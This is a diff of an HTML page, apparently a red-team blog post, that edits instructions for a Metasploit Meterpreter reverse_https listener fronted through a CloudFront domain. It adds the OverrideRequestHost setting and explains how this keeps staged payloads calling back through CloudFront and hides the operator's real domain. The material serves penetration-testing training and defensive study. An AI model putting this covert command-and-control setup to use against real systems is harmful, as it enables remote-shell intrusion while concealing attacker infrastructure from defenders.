@@ -152,12 +152,10 @@ set payload windows/meterpreter/reverse_https
 set LHOST careers.dksfed.com
 set LPORT 443
 set HttpHostHeader d1pd79gjn1xe6f.cloudfront.net
-set HandlerSSLCert /tools/MSF.pem</code></pre></p>
+set HandlerSSLCert /tools/MSF.pem
+set OverrideRequestHost true</code></pre></p>
 
-            <p>The advanced options, when viewed via <code>show advanced</code> should look like this:</p>
-
-            <p class="img-full-screen-sm"><img src="/images/ttps02/06-msf-listener-advanced.png" alt="MSF listener advanced options" /></p>
-
+            <p>It's important to note that the <code>OverrideRequestHost</code> setting must be set to <code>true</code>. This is due to a quirk in the way that Metasploit handles incoming HTTP/S requests by default when generating a configuration for staged payloads. By default, Metasploit uses the incoming request's <code>Host</code> header value (if present) for the second stage configuration instead of the <code>LHOST</code> parameter. Therefore, the stage configuration will be generated so that the requests are sent directly to your hidden domain name because CloudFront passes your internal domain in the forwarded request's <code>Host</code> header. This is obviously not what we required. Using the <code>OverrideRequestHost</code> configuration value, we can force Metasploit to ignore that incoming <code>Host</code> header, and instead use the <code>LHOST</code> configuration value that points to the original CloudFront domain.</p>
 
             <p>These settings should match those that were specified when generating the payload via <code>msfvenom</code>. With the settings correct, launch the listener by running:</p>
 
